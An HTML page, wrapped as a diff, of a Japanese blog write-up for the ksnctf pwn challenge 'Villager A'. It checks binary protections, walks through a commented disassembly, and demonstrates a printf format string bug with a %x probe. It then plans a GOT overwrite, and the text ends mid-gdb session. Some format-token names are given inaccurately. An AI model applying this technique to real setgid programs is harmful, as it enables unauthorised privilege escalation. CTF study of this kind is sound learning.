@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="jp">
+
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>ksnctf 004 Villager A | 逝く道</title>
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="ksnctf 004 Villager A" />
+<meta property="og:locale" content="jp" />
+<meta name="description" content="どこまでも逝こう。" />
+<meta property="og:description" content="どこまでも逝こう。" />
+<link rel="canonical" href="/contents/tech/ctf_ksnctf/2021/05/18/004.html" />
+<meta property="og:url" content="/contents/tech/ctf_ksnctf/2021/05/18/004.html" />
+<meta property="og:site_name" content="逝く道" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-05-18T12:38:04+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="ksnctf 004 Villager A" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2021-05-18T12:38:04+00:00","datePublished":"2021-05-18T12:38:04+00:00","description":"どこまでも逝こう。","headline":"ksnctf 004 Villager A","mainEntityOfPage":{"@type":"WebPage","@id":"/contents/tech/ctf_ksnctf/2021/05/18/004.html"},"url":"/contents/tech/ctf_ksnctf/2021/05/18/004.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="/feed.xml" title="逝く道" /><!-- Global site tag (gtag.js) - Google Analytics -->
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y8XBTJHM0K"></script>
+      <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-Y8XBTJHM0K');
+      </script></head> 
+
+  
+
+  <body><header class="site-header" role="banner">
+
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">逝く道</a>
+    
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <div class="trigger"><a class="page-link" href="/diary/">Diary</a><a class="page-link" href="/tech/">Tech</a><a class="page-link" href="/novel/">Novel</a><a class="page-link" href="/memo/">Memo</a><a class="page-link" href="/junk/">Junk</a><a class="page-link" href="/about/">About</a></div>
+
+    </nav>
+  </div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">ksnctf 004 Villager A</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2021-05-18T12:38:04+00:00" itemprop="datePublished">May 18, 2021
+        
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <details>
+        <summary>目次</summary><ul><li><a href="#ksnctf-004-villager-a">ksnctf 004 Villager A</a><ul><li><a href="#謎解き">謎解き</a></li><li><a href="#セキュリティチェック">セキュリティチェック</a></li><li><a href="#脆弱性の探索">脆弱性の探索</a><ul><li><a href="#canflag0x418">canFlag(0x418)</a></li></ul></li><li><a href="#fsbformat-string-bug">FSB(Format String Bug)</a><ul><li><a href="#余談">余談</a></li></ul></li><li><a href="#攻撃方法の立案">攻撃方法の立案</a></li><li><a href="#下準備1-書き換え対象アドレス">下準備1 書き換え対象アドレス</a></li><li><a href="#下準備2-ジャンプ先アドレス">下準備2 ジャンプ先アドレス</a></li><li><a href="#下準備3-書き換え内容の計算">下準備3 書き換え内容の計算</a></li><li><a href="#謎を解く">謎を解く</a></li></ul></li><li><a href="#所感">所感</a></li></ul></details>
+    <h2 id="ksnctf-004-villager-a">ksnctf 004 Villager A</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル: pwn</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+<p>　<code class="language-plaintext highlighter-rouge">ssh</code> で接続して向こうのサーバーで作業を行うスタイルのようだ。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
+total 12
+<span class="nt">-r--r-----</span> 1 root q4a   22 Feb 26 18:01 flag.txt
+<span class="nt">-r-xr-sr-x</span> 1 root q4a 5857 Feb 26 18:01 q4
+</code></pre></div></div>
+
+<p>　目の前に <code class="language-plaintext highlighter-rouge">flag.txt</code> があるが、ゲストに権限はない。 <code class="language-plaintext highlighter-rouge">q4</code> と言う実行ファイルから <code class="language-plaintext highlighter-rouge">flag.txt</code> の中身を覗くことが出来るのだろう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>file q4
+q4: setgid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.18, BuildID[sha1]<span class="o">=</span>526c75e7f0f34744808eb1b09a5a91880562efc8, not stripped
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">q4</code> は 32bit の ELF ファイルのようだ。 <code class="language-plaintext highlighter-rouge">not stripped</code> のためシンボルも生きている。解析してくださいと言わんばかりである。</p>
+
+<p>　ともかく、実行してみよう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>./q4 
+What<span class="s1">'s your name?
+q4
+Hi, q4
+
+Do you want the flag?
+yes
+Do you want the flag?
+yes
+Do you want the flag?
+no
+I see. Good bye.
+</span></code></pre></div></div>
+
+<p>　名前を尋ねられた後、フラグが欲しいかという問いに答える。 何かを入力すると無限ループであり、<code class="language-plaintext highlighter-rouge">no</code> と入力すると終わりのようだった。</p>
+
+<p>　適切な入力を行えば <code class="language-plaintext highlighter-rouge">q4</code> が <code class="language-plaintext highlighter-rouge">flag.txt</code> を読み込んで表示してくれると思われる。</p>
+
+<p>　ただし、適切と言っても、この実行ファイルの脆弱性を突くような文字列が今回の場合は適切な入力と考えて差し支えないだろう。これが <code class="language-plaintext highlighter-rouge">pwn</code> と呼ばれるジャンルである。</p>
+
+<h3 id="セキュリティチェック">セキュリティチェック</h3>
+<p>　実行ファイルに関連するだろうセキュリティのチェックを行う。</p>
+
+<p>　代表的なセキュリティは決まっており、一つ一つ確認してみようと思う。ここでは、私が用意した確認用シェルスクリプトを流す。調査に十分と思うが、適切でない可能性もあるので、各自でもシェルスクリプトが有効かどうかは判断して欲しい。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ FILE</span><span class="o">=</span><span class="s2">"q4"</span><span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 1: NX"</span><span class="p">;</span>           readelf <span class="nt">-l</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>GNU_STACK<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 2: RELRO"</span><span class="p">;</span>        readelf <span class="nt">-l</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>GNU_RELRO<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 3: Lazy binding"</span><span class="p">;</span> readelf <span class="nt">-d</span> <span class="nv">$FILE</span> | <span class="nb">grep </span>BIND_NOW<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 4: SSP, canary"</span><span class="p">;</span>  readelf <span class="nt">-s</span> <span class="nv">$FILE</span> | <span class="nb">grep</span> <span class="nt">-e</span> __stack_chk_fail <span class="nt">-e</span> __intel_security_cookie<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 5: PIE"</span><span class="p">;</span>  file <span class="nv">$FILE</span> | <span class="nb">grep </span>shared<span class="p">;</span><span class="se">\</span>
+<span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"--- 6: ASLR"</span><span class="p">;</span>         sysctl kernel.randomize_va_space | <span class="nb">grep </span>2<span class="p">;</span>
+
+<span class="nt">---</span> 1: NX
+  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
+<span class="nt">---</span> 2: RELRO
+<span class="nt">---</span> 3: Lazy binding
+<span class="nt">---</span> 4: SSP, canary
+<span class="nt">---</span> 5: PIE
+<span class="nt">---</span> 6: ASLR
+kernel.randomize_va_space <span class="o">=</span> 2
+</code></pre></div></div>
+
+<p>　セキュリティの状態を表に書き起こすと、</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>セキュリティ</th>
+      <th>状態</th>
+      <th>説明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>NX</td>
+      <td>〇有効</td>
+      <td>stack, heap領域での実行権限なし</td>
+    </tr>
+    <tr>
+      <td>RELRO</td>
+      <td>✖無効</td>
+      <td>GOT領域への書き込み権限あり</td>
+    </tr>
+    <tr>
+      <td>Lazy Binding</td>
+      <td>〇有効</td>
+      <td>got.plt にて遅延バインディング</td>
+    </tr>
+    <tr>
+      <td>SSP</td>
+      <td>✖無効</td>
+      <td>canary なし</td>
+    </tr>
+    <tr>
+      <td>PIE</td>
+      <td>✖無効</td>
+      <td>text領域等はランダム化されていない</td>
+    </tr>
+    <tr>
+      <td>ASLR</td>
+      <td>〇有効</td>
+      <td>stack, heap領域はランダム化されている</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　<code class="language-plaintext highlighter-rouge">NX</code> が有効のため、シェルスクリプトを流し込むような手法は使えない。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">RELRO</code>, <code class="language-plaintext highlighter-rouge">Lazy Binding</code> の状態から、これはいわゆる <code class="language-plaintext highlighter-rouge">no RELRO</code>。GOT領域への書き込み(<code class="language-plaintext highlighter-rouge">GOT overwrite</code>) の可能性を感じる。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">SSP</code> が無効のため、stack領域におけるリターンアドレスの書き換えも可能性がある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">PIE</code> が無効のため、コードの任意アドレスにリターンするなどの可能性もある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">ASLR</code> が有効のため、stack, heap領域の位置を固定出来ないため、リターンアドレスを書き換えるためには少々手間がかかる。 32bit実行ファイルであることからブルートフォースによる攻略も考えられる。</p>
+
+<p>　以上が今回対峙することになるだろうセキュリティの状態である。</p>
+
+<h3 id="脆弱性の探索">脆弱性の探索</h3>
+
+<p>　実行ファイルに内在する脆弱性を探す。CTFとなれば大抵何かしらの脆弱性が隠れているものである。</p>
+
+<p>　脆弱性を当てずっぽうで探し当てても良いだろうし、挙動から推察しても良いのだが、今回は逆アセンブルする。</p>
+
+<p>　アセンブリを読むのは今回が実質初めてである。分かった範囲でC言語風に1行ずつコメントを付けた。参考にして欲しい。変数名やラベル名は私が好きにつけているので好きにしてほしい。</p>
+
+<p>　特に <code class="language-plaintext highlighter-rouge">main</code> 関数について逆アセンブル( <code class="language-plaintext highlighter-rouge">objdumpt -d</code> した結果を示す。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>objdump <span class="nt">-d</span> q4
+
+q4:     file format elf32-i386
+
+Disassembly of section .init:
+ ...
+
+ ...
+ 80485b3:       c3                      ret
+
+080485b4 &lt;main&gt;:
+ 80485b4:       55                      push   %ebp
+ 80485b5:       89 e5                   mov    %esp,%ebp
+ 80485b7:       83 e4 f0                and    <span class="nv">$0xfffffff0</span>,%esp
+ 80485ba:       81 ec 20 04 00 00       sub    <span class="nv">$0x420</span>,%esp                  <span class="c"># main関数内の変数（引数, ???, ローカル変数）の合計は 0x420 byte</span>
+ 80485c0:       c7 04 24 a4 87 04 08    movl   <span class="nv">$0x80487a4</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "What's your name?"</span>
+ 80485c7:       e8 f8 fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("What's your name?")</span>
+ 80485cc:       a1 04 9a 04 08          mov    0x8049a04,%eax               <span class="c">#   引数3 stdin</span>
+ 80485d1:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80485d5:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80485dc:       00
+ 80485dd:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80485e1:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80485e4:       e8 9b fe ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, stdin)</span>
+ 80485e9:       c7 04 24 b6 87 04 08    movl   <span class="nv">$0x80487b6</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "Hi, "</span>
+ 80485f0:       e8 bf fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf("Hi, ")</span>
+ 80485f5:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80485f9:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 8048601:       c7 04 24 0a 00 00 00    movl   <span class="nv">$0xa</span>,<span class="o">(</span>%esp<span class="o">)</span>                  <span class="c">#   引数1 "\n"</span>
+ 8048608:       e8 67 fe ff ff          call   8048474 &lt;putchar@plt&gt;        <span class="c"># putchar("\n")</span>
+ 804860d:       c7 84 24 18 04 00 00    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>             <span class="c"># int canFlag = 1</span>
+                                                                            <span class="c"># ↑ 後の動きも加味して適当に変数名をつけている</span>
+ 8048614:       01 00 00 00
+ 8048618:       eb 67                   jmp    8048681 &lt;main+0xcd&gt;          <span class="c"># goto FLAG</span>
+
+ 804861a:       c7 04 24 bb 87 04 08    movl   <span class="nv">$0x80487bb</span>,<span class="o">(</span>%esp<span class="o">)</span>    <span class="c"># LOOP: #   引数1 "Do you want the flag?"</span>
+ 8048621:       e8 9e fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("Do you want the flag?")</span>
+ 8048626:       a1 04 9a 04 08          mov    0x8049a04,%eax               <span class="c">#   引数3 stdin</span>
+ 804862b:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 804862f:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 8048636:       00
+ 8048637:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 804863b:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 804863e:       e8 41 fe ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, stdin)</span>
+ 8048643:       85 c0                   <span class="nb">test</span>   %eax,%eax
+ 8048645:       0f 94 c0                sete   %al
+ 8048648:       84 c0                   <span class="nb">test</span>   %al,%al
+ 804864a:       74 0a                   je     8048656 &lt;main+0xa2&gt;          <span class="c"># goto CMP</span>
+ 804864c:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+ 8048651:       e9 86 00 00 00          jmp    80486dc &lt;main+0x128&gt;         <span class="c"># goto END</span>
+
+ 8048656:       c7 44 24 04 d1 87 04    movl   <span class="nv">$0x80487d1</span>,0x4<span class="o">(</span>%esp<span class="o">)</span> <span class="c"># CMP:  #   引数2 "no"</span>
+ 804865d:       08
+ 804865e:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 8048662:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 8048665:       e8 7a fe ff ff          call   80484e4 &lt;strcmp@plt&gt;         <span class="c"># if(strcmp(input, "no") != 0)</span>
+ 804866a:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓</span>
+ 804866c:       75 13                   jne    8048681 &lt;main+0xcd&gt;          <span class="c"># goto FLAG</span>
+                                                                            <span class="c"># ↓↓↓↓ ------ else --------- ↓↓↓↓</span>
+ 804866e:       c7 04 24 d5 87 04 08    movl   <span class="nv">$0x80487d5</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "I see. Good bye"</span>
+ 8048675:       e8 4a fe ff ff          call   80484c4 &lt;puts@plt&gt;           <span class="c"># puts("I see. Good bye")</span>
+ 804867a:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+ 804867f:       eb 5b                   jmp    80486dc &lt;main+0x128&gt;         <span class="c"># goto END</span>
+                                                                            <span class="c"># ↑↑↑↑ --------------------- ↑↑↑↑</span>
+
+ 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+                                                                            <span class="c"># ↓↓↓↓ flag.txt を読み込んで表示する処理 ↓↓↓↓</span>
+ 8048691:       c7 44 24 04 e6 87 04    movl   <span class="nv">$0x80487e6</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>         <span class="c">#   引数2 "flag.txt"</span>
+ 8048698:       08
+ 8048699:       c7 04 24 e8 87 04 08    movl   <span class="nv">$0x80487e8</span>,<span class="o">(</span>%esp<span class="o">)</span>            <span class="c">#   引数1 "r"</span>
+ 80486a0:       e8 ff fd ff ff          call   80484a4 &lt;fopen@plt&gt;          <span class="c"># fp = fopen("flag.txt", "r")</span>
+ 80486a5:       89 84 24 1c 04 00 00    mov    %eax,0x41c<span class="o">(</span>%esp<span class="o">)</span>
+ 80486ac:       8b 84 24 1c 04 00 00    mov    0x41c<span class="o">(</span>%esp<span class="o">)</span>,%eax             <span class="c">#   引数3 FILE* fp</span>
+ 80486b3:       89 44 24 08             mov    %eax,0x8<span class="o">(</span>%esp<span class="o">)</span>
+ 80486b7:       c7 44 24 04 00 04 00    movl   <span class="nv">$0x400</span>,0x4<span class="o">(</span>%esp<span class="o">)</span>             <span class="c">#   引数2 0x400 = 1024</span>
+ 80486be:       00
+ 80486bf:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486c3:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486c6:       e8 b9 fd ff ff          call   8048484 &lt;fgets@plt&gt;          <span class="c"># fgets(input, 1024, fp)</span>
+ 80486cb:       8d 44 24 18             lea    0x18<span class="o">(</span>%esp<span class="o">)</span>,%eax              <span class="c">#   引数1 char input[400]</span>
+ 80486cf:       89 04 24                mov    %eax,<span class="o">(</span>%esp<span class="o">)</span>
+ 80486d2:       e8 <span class="nb">dd </span>fd ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+ 80486d7:       b8 00 00 00 00          mov    <span class="nv">$0x0</span>,%eax
+                                                                            <span class="c"># ↑↑↑↑ ------------------------------- ↑↑↑↑</span>
+
+ 80486dc:       c9                      leave                       <span class="c"># END: # </span>
+ 80486dd:       c3                      ret
+ 80486de:       90                      nop
+ 80486df:       90                      nop
+
+080486e0 &lt;__libc_csu_fini&gt;:
+ ...
+</code></pre></div></div>
+
+<h4 id="canflag0x418">canFlag(0x418)</h4>
+<p>　まず注目すべき点は、どのような入力をしてもフラグを表示してくれそうにないということである。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 8048681:       8b 84 24 18 04 00 00    mov    0x418<span class="o">(</span>%esp<span class="o">)</span>,%eax     <span class="c"># FLAG: # if(canFlag == 1)</span>
+ 8048688:       85 c0                   <span class="nb">test</span>   %eax,%eax                    <span class="c">#   ↓ canFlag(0x418) は 1 に初期化されている</span>
+ 804868a:       0f 95 c0                setne  %al                          <span class="c">#   ↓ 従って必ず式の結果は true</span>
+ 804868d:       84 c0                   <span class="nb">test</span>   %al,%al                      <span class="c">#   ↓ goto LOOP の処理を避けることは出来ない</span>
+ 804868f:       75 89                   jne    804861a &lt;main+0x66&gt;          <span class="c"># goto LOOP</span>
+</code></pre></div></div>
+
+<p>　上記4行で行っているのは <code class="language-plaintext highlighter-rouge">if(canFlag == 1)</code> に相当する処理であり、 <code class="language-plaintext highlighter-rouge">canFlag(0x418)</code> 変数の値は</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 804860d:       c7 84 24 18 04 00 00    movl   <span class="nv">$0x1</span>,0x418<span class="o">(</span>%esp<span class="o">)</span>             <span class="c"># int canFlag = 1</span>
+</code></pre></div></div>
+
+<p>　の行で <code class="language-plaintext highlighter-rouge">1</code> に初期化されている（ <code class="language-plaintext highlighter-rouge">804860d</code> アドレスを参考に逆アセンブル結果を見て欲しい。 <code class="language-plaintext highlighter-rouge">LOOP</code> ラベルの直前だ）</p>
+
+<p>　従って、正常な処理フローではこのif文を抜けられず、その後に続く <code class="language-plaintext highlighter-rouge">flag.txt</code> を <code class="language-plaintext highlighter-rouge">fopen()</code> で読み出して <code class="language-plaintext highlighter-rouge">printf()</code> で表示する処理に到達できないことが分かる。</p>
+
+<p>　これこそが、この問題が提示している<strong>謎</strong>である。</p>
+
+<h3 id="fsbformat-string-bug">FSB(Format String Bug)</h3>
+<p>　謎を解く鍵は、このプログラムの持つ脆弱性 <code class="language-plaintext highlighter-rouge">Format String Bug</code> だ。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code> 80485fc:       e8 b3 fe ff ff          call   80484b4 &lt;<span class="nb">printf</span>@plt&gt;         <span class="c"># printf(input)</span>
+</code></pre></div></div>
+
+<p>　この行こそ脆弱性である。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">FSB(Format String Bug)</code> は、書式指定可能な関数においてメモリの内容を読み・書きが可能な脆弱性である。今回は <code class="language-plaintext highlighter-rouge">printf</code> 関数であり、正しく使えば何も問題はないのだが。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>    <span class="c1">// 脆弱性なし</span>
+<span class="n">printf</span><span class="p">(</span><span class="n">input</span><span class="p">);</span>          <span class="c1">// 脆弱性あり</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">printf</code> 関数の書き方一つで脆弱性を持ってしまう。</p>
+
+<p>　実際に入力して脆弱性を確認してみよう。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>./q4
+What<span class="s1">'s your name?
+AAAA,%x,%x,%x,%x,%x,%x,%x
+Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825
+
+Do you want the flag?
+</span></code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">%x</code> は16進数で値を表示する書式トークンであり、見事にメモリの読み出しに成功している。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">AAAA</code> と言う文字列は16進数表現だと <code class="language-plaintext highlighter-rouge">41414141</code> になり、丁度6番目の <code class="language-plaintext highlighter-rouge">%x</code> に値が出現している。</p>
+
+<p>　このように、書式トークンが機能することこそが脆弱性なのである。</p>
+
+<h4 id="余談">余談</h4>
+<p>　逆アセンブル結果から、main関数で使われる変数の合計は <code class="language-plaintext highlighter-rouge">0x420 byte</code> であることが分かる。</p>
+
+<p>　注意深く変数を拾っていき、<code class="language-plaintext highlighter-rouge">Hi, AAAA,400,f7cdc580,ffb69918,6,0,41414141,252c7825</code> という読み出し結果を合わせると、以下のようになっているのが分かる。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#   esp + [0x0  ~ 0x3]    --- 引数1 : input</span>
+<span class="c">#   esp + [0x4  ~ 0x7]    --- 引数2 : 0x400</span>
+<span class="c">#   esp + [0x8  ~ 0xB]    --- 引数3 : stdin : f7cdc580</span>
+<span class="c">#   esp + [0xC  ~ 0xF]    --- ？？？？？ : ffb69918</span>
+<span class="c">#   esp + [0x10 ~ 0x13]   --- ？？？？？ : 6</span>
+<span class="c">#   esp + [0x14 ~ 0x17]   --- ？？？？？ : 0</span>
+<span class="c">#   esp + [0x18 ~ 0x417]  --- char input[400] : 41414141, 252c7825, ...</span>
+<span class="c">#   esp + [0x418 ~ 0x41B] --- int canShowFlag = 1 // 4byte</span>
+<span class="c">#   esp + [0x41C ~ 0x41F] --- FILE* fp            // ポインタのため 4byte</span>
+</code></pre></div></div>
+
+<p>　読み出し結果は <code class="language-plaintext highlighter-rouge">esp + 0x4</code> ~ <code class="language-plaintext highlighter-rouge">esp + 0x19</code> までを表示しているわけである。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">esp + 0x0</code> ~ <code class="language-plaintext highlighter-rouge">esp +0xB</code> までは引数として使われているのだが、 <code class="language-plaintext highlighter-rouge">esp + 0xC</code> ~ <code class="language-plaintext highlighter-rouge">esp + 0x17</code> の領域が何に使われているのかは最後まで不明だった。気になる人は調べてみて欲しい。</p>
+
+<p>　余談は以上である。</p>
+
+<h3 id="攻撃方法の立案">攻撃方法の立案</h3>
+
+<p>　さて、セキュリティと脆弱性について確認した。これで攻撃方法を確定する。今回は、</p>
+
+<ul>
+  <li>セキュリティ: <code class="language-plaintext highlighter-rouge">no RELRO</code></li>
+  <li>脆弱性: <code class="language-plaintext highlighter-rouge">FSB(Format String Bug)</code></li>
+</ul>
+
+<p>　という特徴を利用しようと思う。題して、「<code class="language-plaintext highlighter-rouge">Format String Bug</code> を利用した <code class="language-plaintext highlighter-rouge">GOT overwrite</code>」。</p>
+
+<p>　※ GOT(Global Offset Table)</p>
+
+<h3 id="下準備1-書き換え対象アドレス">下準備1 書き換え対象アドレス</h3>
+
+<p>　<code class="language-plaintext highlighter-rouge">FSB</code> を利用すると任意のメモリの値を書き換えることも出来る。これには <code class="language-plaintext highlighter-rouge">%n</code> <code class="language-plaintext highlighter-rouge">%hc</code> <code class="language-plaintext highlighter-rouge">%hnn</code> といった書式トークンを使う（それぞれ 4byte, 2byte, 1byte の書き込みを実現する）。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">no RELRO</code> であるため、 <code class="language-plaintext highlighter-rouge">FSB</code> を使って GOT のリターンアドレスを書き換えることが出来る。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">GOT overwrite</code> の対象となるリターンアドレスだが、今回は <code class="language-plaintext highlighter-rouge">puts</code> 関数のリターンアドレスにしよう。これからそのアドレスを確認する。</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>q4@eceec62b961b ~]<span class="nv">$ </span>gdb <span class="nt">-q</span> q4
+Reading symbols from q4...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+   0x080485b4 &lt;+0&gt;:     push   %ebp
+   0x080485b5 &lt;+1&gt;:     mov    %esp,%ebp
+   0x080485b7 &lt;+3&gt;:     and    <span class="nv">$0xfffffff0</span>,%esp
+   0x080485ba &lt;+6&gt;:     sub    <span class="nv">$0x420</span>,%esp
+   0x080485c0 &lt;+12&gt;:    movl   <span class="nv">$0x80487a4</span>,<span class="o">(</span>%esp<span class="o">)</span>
+   0x080485c7 &lt;+19&gt;:    call   0x80484c4 &lt;puts@plt&gt;     <span class="c"># breakpoint 1</span>
